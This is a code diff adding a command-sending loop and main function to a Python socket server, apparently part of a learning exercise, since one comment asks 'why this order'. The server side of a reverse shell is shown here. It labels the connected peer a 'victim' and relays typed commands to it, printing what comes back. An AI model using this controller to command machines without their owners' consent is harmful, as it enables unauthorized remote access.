@@ -38,3 +38,24 @@ def socket_listen():
     print("connection has been established:", conn, "addres is ", address[0], "port:", address[1])
     send_command(conn)
     conn.close()
+
+
+# send command to victim/client
+def send_command(conn):
+    while True:
+        cmd = input()
+        if cmd == "quit":
+            conn.close()
+            s.close()
+            sys.exit()
+        #     question: why this order
+        if len(str.encode(cmd)) > 0:
+            conn.send(str.encode(cmd))
+            client_resp = str(conn.recv(1024), "utf-8")
+            print(client_resp, end="")
+            
+
+def main():
+    create_socket()
+    bind_socket()
+    socket_listen()
